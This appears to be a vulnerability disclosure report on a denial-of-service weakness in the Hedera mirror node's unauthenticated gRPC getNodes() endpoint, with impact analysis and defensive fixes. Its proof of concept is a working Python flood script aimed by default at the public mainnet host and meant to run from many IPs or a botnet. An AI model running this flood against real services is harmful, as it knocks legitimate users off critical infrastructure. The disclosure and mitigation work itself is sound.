### Title
Unauthenticated Distributed Flood of `getNodes()` Exhausts Bounded-Elastic Thread Pool and DB Connection Pool

### Summary
`NetworkController.getNodes()` is a publicly accessible gRPC endpoint with no authentication, no global rate limiting, and no per-IP connection cap. The only guard — `maxConcurrentCallsPerConnection = 5` — is scoped per TCP connection, so an attacker opening connections from many source IPs (botnet, cloud VMs) multiplies that budget linearly. Each call occupies a `Schedulers.boundedElastic()` worker thread for at least 250 ms (one `pageDelay` cycle) and issues multiple synchronous DB queries, making it straightforward to exhaust both the reactive thread pool and the database connection pool, starving legitimate callers.

**Root cause:** The design assumes a single connection per client and relies on `maxConcurrentCallsPerConnection` as the sole concurrency brake. This assumption fails when an attacker controls many source IPs, each opening independent TCP connections.

### Impact Explanation

Each `getNodes()` call:
- Holds a `boundedElastic` thread for ≥ 250 ms per page (default `pageDelay`).
- Issues at least two synchronous DB queries (`findLatestTimestamp`, `findAllStakeByConsensusTimestamp`) plus one per page (`findByConsensusTimestampAndNodeId`).

`Schedulers.boundedElastic()` caps at `10 × availableProcessors` threads (e.g., 80 on an 8-core pod). With N attacker connections each sending 5 concurrent calls, 5N threads are consumed. At N = 17 connections the pool is saturated; beyond that, tasks queue in the 100 000-slot internal queue, causing legitimate requests to wait indefinitely. Simultaneously, the DB connection pool (typically 10–20 connections) is exhausted, returning connection-acquisition timeouts to all callers. The address book is critical infrastructure: clients that cannot query it cannot discover consensus nodes. [6](#0-5) 

### Likelihood Explanation

- **No authentication required** — any internet host can open a gRPC/HTTP2 connection to port 5600.
- **Low cost** — 20–50 cloud VMs or a small botnet suffice; each VM opens one connection and fires 5 concurrent streams.
- **Repeatable** — calls complete quickly (address book is small), so the attacker can immediately re-issue them, maintaining continuous pressure.
- **No existing detection** — the only alert is `GrpcHighMemory` / `GrpcQueryLatency`; there is no alert for connection count or call rate. [7](#0-6) 

### Recommendation

1. **Add a global gRPC server interceptor** that enforces a token-bucket rate limit (e.g., bucket4j, same pattern as `web3/ThrottleConfiguration`) on `getNodes()` calls, keyed on remote IP extracted from `io.grpc.Grpc.TRANSPORT_ATTR_REMOTE_ADDR`.
2. **Set a global connection limit** in `GrpcConfiguration` via `NettyServerBuilder.maxConnectionAge()`, `maxConnectionIdle()`, and a total connection cap (e.g., via a custom `ServerTransportFilter`).
3. **Cache the full `getNodes()` result** at the `NetworkServiceImpl` level (not just properties) using Spring Cache with the existing `cacheExpiry`/`cacheSize` properties, so repeated calls within the TTL do not hit the DB or the scheduler at all.
4. **Expose a Prometheus metric** for active gRPC call count and alert when it exceeds a threshold.

### Proof of Concept

```python
# Requires: pip install grpcio grpcio-tools
import grpc, threading
from hedera import mirror_network_service_pb2_grpc, network_service_pb2

TARGET = "mirror.mainnet.hedera.com:443"  # or self-hosted IP:5600

def flood(thread_id):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = mirror_network_service_pb2_grpc.NetworkServiceStub(channel)
    while True:
        try:
            # Send 5 concurrent streaming calls per connection (maxConcurrentCallsPerConnection)
            futures = [stub.getNodes.future(network_service_pb2.AddressBookQuery())
                       for _ in range(5)]
            for f in futures:
                list(f.result())  # drain
        except Exception:
            pass

# Launch from N distinct source IPs (cloud VMs / botnet)
threads = [threading.Thread(target=flood, args=(i,)) for i in range(50)]
for t in threads: t.start()
for t in threads: t.join()
```

With 50 connections × 5 concurrent calls = 250 simultaneous `getNodes()` invocations, each holding a `boundedElastic` thread for ≥ 250 ms, the thread pool (≤ 80 threads on a typical pod) is saturated within seconds. Legitimate callers receive `RESOURCE_EXHAUSTED` or hang until the gRPC deadline fires. [1](#0-0)
